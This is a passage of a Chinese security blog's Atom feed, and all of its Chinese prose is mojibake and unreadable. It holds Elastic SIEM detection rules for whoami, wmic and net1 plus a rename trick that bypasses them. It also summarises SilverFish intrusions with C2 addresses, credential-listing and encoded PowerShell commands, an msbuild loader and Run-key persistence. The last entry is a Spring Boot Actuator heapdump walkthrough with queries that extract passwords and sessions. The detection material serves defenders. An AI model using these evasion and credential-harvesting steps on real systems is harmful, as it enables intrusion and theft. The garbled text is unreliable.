class="language-none">registry where registry.path : &quot;HKLM\\SAM\\SAM\\Domains\\Account\\Users\\Names\\*$\\&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šWindows Script Executing PowerShell<br>è§„åˆ™ä»‹ç»ï¼šä½¿ç”¨wscriptæˆ–è€…cscriptæ‰§è¡ŒPowershell</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  process.parent.name : (&quot;cscript.exe&quot;, &quot;wscript.exe&quot;) and process.name : &quot;powershell.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šWindows Suspicious Command<br>è§„åˆ™ä»‹ç»ï¼šWindowså¯ç–‘å‘½ä»¤</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) andprocess.pe.original_file_name in (&quot;whoami.exe&quot;, &quot;tasklist.exe&quot;, &quot;ipconfig.exe&quot;, &quot;powershell.exe&quot;, &quot;sctasks.exe&quot;, &quot;bitsadmin.exe&quot;, &quot;netstat.exe&quot;, &quot;systeminfo.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šSecurity Software Discovery using WMIC<br>è§„åˆ™ä»‹ç»ï¼šä½¿ç”¨wmicæŸ¥è¯¢å®‰å…¨è½¯ä»¶</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and   (process.name:&quot;wmic.exe&quot; or process.pe.original_file_name:&quot;wmic.exe&quot;) and    process.args:&quot;&#x2F;namespace:\\\\root\\SecurityCenter2&quot; and process.args:&quot;Get&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><p>è§„åˆ™åç§°ï¼šNet command via SYSTEM account<br>è§„åˆ™ä»‹ç»ï¼šä»¥SYSTEMæƒé™æ‰§è¡Œnet.exe</p><pre class="line-numbers language-none"><code class="language-none">process where event.type in (&quot;start&quot;, &quot;process_started&quot;) and  user.id in (&quot;S-1-5-18&quot;, &quot;S-1-5-19&quot;, &quot;S-1-5-20&quot;) and  process.name : &quot;whoami.exe&quot; or  (process.name : &quot;net1.exe&quot; and not process.parent.name : &quot;net.exe&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://github.com/SigmaHQ/sigma">sigma</a>(Generic Signature Format for SIEM Systems)ï¼Œè¿™ç§æè¿°æ–¹å¼ç‰¹åˆ«åƒç—…æ¯’è½¯ä»¶çš„ç‰¹å¾ç ã€‚</p><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><ul><li>ç»•è¿‡çš„æ–¹å¼åº”è¯¥è¿˜æœ‰å¾ˆå¤šï¼Œæœªæµ‹è¯•</li><li>å®‰éª‘å£«çš„åŸç†ç±»ä¼¼ï¼Œæ¯”å¦‚ç¢°åˆ°è¿‡é˜¿é‡Œäº‘ä¸Šæ‰§è¡Œ<code>whoamiã€systeminfo</code>å°±å‘Šè­¦</li><li>çœ‹å®Œ<a href="http://weizn.net/?p=439">é€šè¿‡SYSMONæ—¥å¿—æ£€æµ‹Cobalt Strikeæœ¨é©¬</a>æˆ‘è§‰å¾—è¿™ä¸ªæ‰æ˜¯SIEMçš„è§£å†³æ–¹å¼</li></ul><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-1">SIEMå®éªŒç³»åˆ—-1</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-2">SIEMå®éªŒç³»åˆ—-2</a></li><li><a href="https://unicornsec.com/home/siem-home-lab-series-part-3">SIEMå®éªŒç³»åˆ—-3</a></li><li><a href="http://weizn.net/?p=439">é€šè¿‡SYSMONæ—¥å¿—æ£€æµ‹Cobalt Strikeæœ¨é©¬</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;å®‰è£…&quot;&gt;&lt;a href=&quot;#å®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;å®‰è£…&quot;&gt;&lt;/a&gt;å®‰è£…&lt;/h3&gt;&lt;p&gt;å‚è€ƒé“¾æ¥é‡Œæœ‰è¯¦ç»†çš„å®‰è£…æ­¥éª¤ï¼Œæµ‹è¯•å®¢æˆ·ç«¯æ˜¯Windowsï¼Œå®‰è£…äº†å¦‚ä¸‹è½¯ä»¶ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sysmon.exe(&lt;a href=&quot;https://github.com/SwiftOnSecurity/sysmon-config&quot;&gt;é…ç½®æ–‡ä»¶&lt;/a&gt;)&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\sysmon64.exe -accepteula -i c:\windows\config.xml&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;winlogbeat.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\install-service-winlogbeat.ps1&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.\winlogbeat.exe setup -e&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ElasticAgent.exe&lt;ul&gt;
&lt;li&gt;&lt;code&gt;.\elastic-agent.exe install  --insecure -f --fleet-server-es=&amp;lt;ES&amp;gt; --fleet-server-service-token=&amp;lt;token&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot;&gt;&lt;a href=&quot;#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot;&gt;&lt;/a&gt;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&lt;/h3&gt;&lt;p&gt;è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:&lt;br&gt;&lt;img src=&quot;/2021/08/02/siem-on-elk/siem-1.png&quot;&gt;&lt;br&gt;SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„&lt;code&gt;whoami&lt;/code&gt;æŸ¥è¯¢è§„åˆ™(&lt;del&gt;æ­£ç»äººè°æŸ¥whoamiå•Š&lt;/del&gt;):&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.name : &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º&lt;code&gt;whoami.exe&lt;/code&gt;çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ&lt;code&gt;whoami.exe&lt;/code&gt;å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶&lt;code&gt;net.exe&lt;/code&gt;ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°&lt;code&gt;process.pe.original_file_name&lt;/code&gt;ä»ç„¶ä¿ç•™äº†&lt;code&gt;whoami.exe&lt;/code&gt;ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.pe.original_file_name: &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Silverè°ƒæŸ¥æŠ¥å‘Š</title>
    <link href="https://jkme.github.io/2021/07/29/silverFish.html"/>
    <id>https://jkme.github.io/2021/07/29/silverFish.html</id>
    <published>2021-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p></blockquote><h1 id="èµ·ç‚¹"><a href="#èµ·ç‚¹" class="headerlink" title="èµ·ç‚¹"></a>èµ·ç‚¹</h1><p>æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: <code>81.4.122.203</code>ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°<code>81.4.122.101</code>å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚</p><h3 id="C2åˆ†æ"><a href="#C2åˆ†æ" class="headerlink" title="C2åˆ†æ"></a>C2åˆ†æ</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p><p>æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>ID</li><li>UUID</li><li>Instance</li><li>IP</li><li>Country</li><li>Domain\User@Computer</li><li>OS</li><li>Build</li><li>Architecture</li><li>Antivirus</li><li>Is Admin</li><li>Integrity Level</li><li>UAC Setting</li><li>ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop</li><li>First visit</li></ul><p>æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š<br><img src="/2021/07/29/silverFish/silver_command.png"></p><p>çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š</p><ul><li>ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ</li><li>å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰</li><li>ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®</li></ul><p><img src="/2021/07/29/silverFish/silver_ip.png"></p><h3 id="TDS-Traffic-Distrbution-System-ç³»ç»Ÿåˆ†æ"><a href="#TDS-Traffic-Distrbution-System-ç³»ç»Ÿåˆ†æ" class="headerlink" title="TDS(Traffic Distrbution System)ç³»ç»Ÿåˆ†æ"></a>TDS(Traffic Distrbution System)ç³»ç»Ÿåˆ†æ</h3><p>  æ˜¯ä¸€ä¸ªç±»ä¼¼è´Ÿè½½å‡è¡¡çš„ç³»ç»Ÿï¼Œå¯ä»¥æŠŠå—å®³è€…çš„æµé‡å®šå‘åˆ°ä¸åŒçš„C2æœåŠ¡å™¨ï¼Œå› ä¸ºå—å®³è€…å¤§æ¦‚æœ‰4åƒå¤šä¸ªï¼ŒåŒæ—¶è¿™ä¸ªç³»ç»Ÿå¯ä»¥æ ¹æ®å›½å®¶æ¥åˆ†ç»„ï¼Œå¹¶ä¸”ç±»ä¼¼JIRAçš„ç³»ç»Ÿï¼ŒæŒ‡å®šå—å®³è€…ç»™ä¸åŒçš„é»‘å®¢ã€‚<br>  <img src="/2021/07/29/silverFish/tds.png"></p><p> æµé‡åˆ†å‘ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†æ˜¯ç”±å¯ä¿¡ç½‘ç«™ç»„æˆçš„ï¼Œè¿™ç§ç½‘ç«™è¢«é»‘äº†ä¹‹åï¼ŒåŠ å…¥phpå’Œjsä»£ç ï¼Œåˆ¤æ–­æ¯ä¸ªè¯·æ±‚æ˜¯å¦ç¬¦åˆä¸€å®šçš„ç‰¹å¾ï¼Œç¬¦åˆç‰¹å¾ä¹‹åä¼šå‘ç‰¹å®šç½‘ç«™å‘é€ä¸€ä¸ªGETè¯·æ±‚ã€‚</p><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>å¸¸ç”¨å‘½ä»¤<ul><li>nltest /dclist  åˆ—åŸŸæ§</li><li>nltest /domain_trusts</li><li>cmdkey /list  åˆ—å·²å­˜å‚¨çš„å¯†ç </li><li>net group â€œdomain adminsâ€ /domain  æŸ¥çœ‹åŸŸæ§ç®¡ç†å‘˜</li><li>powershell -nop -enc xxx  æ‰§è¡Œå‘½ä»¤</li></ul></li></ul><p><img src="/2021/07/29/silverFish/silver_post.png"></p><p>ä½¿ç”¨çš„å…¶ä¸­ä¸€ä¸ªæ¨ªå‘å·¥å…·æ˜¯Koadicï¼Œä¸€èˆ¬é€šè¿‡mshtaè¿è¡Œæ··æ·†ä¹‹åçš„è„šæœ¬ï¼š<br><img src="/2021/07/29/silverFish/silver_koadic.png"></p><h4 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h4><p>cobaltstrikeä½¿ç”¨äº†åŸŸå‰ç½®çš„æŠ€æœ¯ï¼Œæ¯”å¦‚<code>twimg-us.azureedge.net</code>, <code>d3ser9acyt7cdp.cloudfront.net</code>ï¼Œå…¶ä¸­ä¸€ä¸ªä¸Šçº¿çš„æ–¹å¼æ˜¯ä½¿ç”¨msbuildï¼š<code>C:\Windows\Microsoft.Net\Framework64\v4.0.30319\msbuild.exe C:\ms654.csproj</code><br><img src="/2021/07/29/silverFish/silver_cdn.png"></p><h3 id="VictimTotal-Sandbox"><a href="#VictimTotal-Sandbox" class="headerlink" title="VictimTotal Sandbox"></a>VictimTotal Sandbox</h3><p>ç ”ç©¶äººå‘˜å‘ç°çš„æœ€éœ‡æƒŠçš„Webå¹³å°ï¼ŒSilverFishä½¿ç”¨å—å®³è€…ä½œä¸ºæ€è½¯æµ‹è¯•äº‘ç«¯å¹³å°ï¼Œæ§åˆ¶äº†è¶…è¿‡6000ä¸ªè®¾å¤‡ä¸»æœºï¼Œä¸å®šæœŸæµ‹è¯•æœ¨é©¬è„šæœ¬çš„å…æ€æ€§ã€‚</p><p><img src="/2021/07/29/silverFish/silver_sandbox.png"></p><p>Powershellè„šæœ¬çš„ç¼–ç æ˜¯è¿™æ ·çš„: ä½¿ç”¨6å­—èŠ‚çš„keyåšä¸€æ¬¡xorâ€“&gt;base64ç¼–ç â€“&gt;AESåŠ å¯†â€“&gt;æ··æ·†ã€‚</p><h3 id="NetSupportManager"><a href="#NetSupportManager" class="headerlink" title="NetSupportManager"></a>NetSupportManager</h3><p>æŠŠNetSupportManagerç¨‹åºé‡Œé¢çš„client32.exeé‡å‘½åä¸ºctfmon.exeï¼Œç„¶åè®¾ç½®æŒä¹…åŒ–åé—¨ï¼š<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </code></p><h3 id="è¯»åæ„Ÿ"><a href="#è¯»åæ„Ÿ" class="headerlink" title="è¯»åæ„Ÿ"></a>è¯»åæ„Ÿ</h3><ul><li>é«˜åº¦çš„ç»„ç»‡åŒ–ï¼Œå…·æœ‰ä»£è¡¨æ€§çš„TDSç³»ç»Ÿ</li><li>C2ç•Œé¢å¾ˆç®€æ´</li><li>äº‘æ²™ç›’çš„æ¦‚å¿µçœŸå‰å®³</li><li>å¾ˆå¥½å¥‡æ€ä¹ˆæ—¥è¿›å»çš„ï¼ŒåŸŸå‰ç½®çš„åŸŸåä¸ºå•¥æ˜¯Oracleçš„ï¼Ÿ</li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf&quot;&gt;SilverFish_TLPWHITE&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;èµ·ç‚¹&quot;&gt;&lt;a href=&quot;#èµ·ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;èµ·ç‚¹&quot;&gt;&lt;/a&gt;èµ·ç‚¹&lt;/h1&gt;&lt;p&gt;æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: &lt;code&gt;81.4.122.203&lt;/code&gt;ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°&lt;code&gt;81.4.122.101&lt;/code&gt;å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;h3 id=&quot;C2åˆ†æ&quot;&gt;&lt;a href=&quot;#C2åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;C2åˆ†æ&quot;&gt;&lt;/a&gt;C2åˆ†æ&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_C2.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ID&lt;/li&gt;
&lt;li&gt;UUID&lt;/li&gt;
&lt;li&gt;Instance&lt;/li&gt;
&lt;li&gt;IP&lt;/li&gt;
&lt;li&gt;Country&lt;/li&gt;
&lt;li&gt;Domain\User@Computer&lt;/li&gt;
&lt;li&gt;OS&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Architecture&lt;/li&gt;
&lt;li&gt;Antivirus&lt;/li&gt;
&lt;li&gt;Is Admin&lt;/li&gt;
&lt;li&gt;Integrity Level&lt;/li&gt;
&lt;li&gt;UAC Setting&lt;/li&gt;
&lt;li&gt;ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop&lt;/li&gt;
&lt;li&gt;First visit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š&lt;br&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_command.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuatoræ¼æ´å¤ç°</title>
    <link href="https://jkme.github.io/2021/05/27/spring-boot-actuator.html"/>
    <id>https://jkme.github.io/2021/05/27/spring-boot-actuator.html</id>
    <published>2021-05-26T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.952Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-åŸºæœ¬çŸ¥è¯†"><a href="#0x01-åŸºæœ¬çŸ¥è¯†" class="headerlink" title="0x01. åŸºæœ¬çŸ¥è¯†"></a>0x01. åŸºæœ¬çŸ¥è¯†</h3><ol><li>åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®</li></ol><pre class="line-numbers language-none"><code class="language-none">management:  security:    enabled: false  health:    elasticsearch:      enabled: false  metrics:    export:      prometheus:        enabled: true      jmx:        enabled: true  endpoints:    web:      exposure:        include: &#39;*&#39;      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š<code>management.endpoints.web.base-path=/monitor</code></p><p>  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š</p><h3 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h3><p>åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator&#x2F;auditevents&#x2F;autoconfig&#x2F;beans&#x2F;caches&#x2F;conditions&#x2F;configprops&#x2F;docs&#x2F;dump&#x2F;env&#x2F;flyway&#x2F;health&#x2F;heapdump&#x2F;httptrace&#x2F;info&#x2F;intergrationgraph&#x2F;jolokia&#x2F;logfile&#x2F;loggers&#x2F;liquibase&#x2F;metrics&#x2F;mappings&#x2F;prometheus&#x2F;refresh&#x2F;scheduledtasks&#x2F;sessions&#x2F;shutdown&#x2F;trace&#x2F;threaddump&#x2F;actuator&#x2F;auditevents&#x2F;actuator&#x2F;beans&#x2F;actuator&#x2F;health&#x2F;actuator&#x2F;conditions&#x2F;actuator&#x2F;configprops&#x2F;actuator&#x2F;env&#x2F;actuator&#x2F;info&#x2F;actuator&#x2F;loggers&#x2F;actuator&#x2F;heapdump&#x2F;actuator&#x2F;threaddump&#x2F;actuator&#x2F;metrics&#x2F;actuator&#x2F;scheduledtasks&#x2F;actuator&#x2F;httptrace&#x2F;actuator&#x2F;mappings&#x2F;actuator&#x2F;jolokia&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥é€šè¿‡<code>/heapdump</code>è¿™ä¸ªèŠ‚ç‚¹è·å–å†…å­˜ï¼Œç„¶åä½¿ç”¨<a href="https://www.eclipse.org/mat/downloads.php">Memory Analyzer</a>åˆ†æå†…å­˜ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ï¼Œå¸¸ç”¨æŸ¥è¯¢ï¼š</p><pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))æˆ–select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))  select* from java.util.Hashtable$Entry x WHERE(toString(x.key).contains(&quot;username&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;url&quot;))select* from java.lang.String s WHERE toString(s) LIKE &quot;.*password.*&quot;select* from org.springframework.web.context.support.StandardServletEnvironmentselect* from java.lang.String s WHERE toString(s) LIKE &quot;.*SESSION.*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><ul><li>å‚è€ƒé“¾æ¥é‡Œé¢ï¼Œå½“ä¸‹è½½/heapdumpæ˜¯403çš„æ—¶å€™, <code>/heapdump.json</code>å¯ä»¥ä¸‹è½½æˆåŠŸï¼Œè¿™ä¸ªåœ¨springå¯åŠ¨çš„æ—¶å€™å¯ä»¥çœ‹åˆ°è·¯ç”±ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹ä¿¡æ¯éƒ½å­˜åœ¨<code>.json</code>è·¯å¾„</li></ul><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA">æ¸—é€å¤§å‹è èœç½‘ç«™é¸­è„–</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-åŸºæœ¬çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-åŸºæœ¬çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01. åŸºæœ¬çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01. åŸºæœ¬çŸ¥è¯†&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;
&amp;lt;dependency&amp;gt;
   &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;&amp;#x2F;groupId&amp;gt;
   &amp;lt;artifactId&amp;gt;spring-boot-starter-actuator&amp;lt;&amp;#x2F;artifactId&amp;gt;
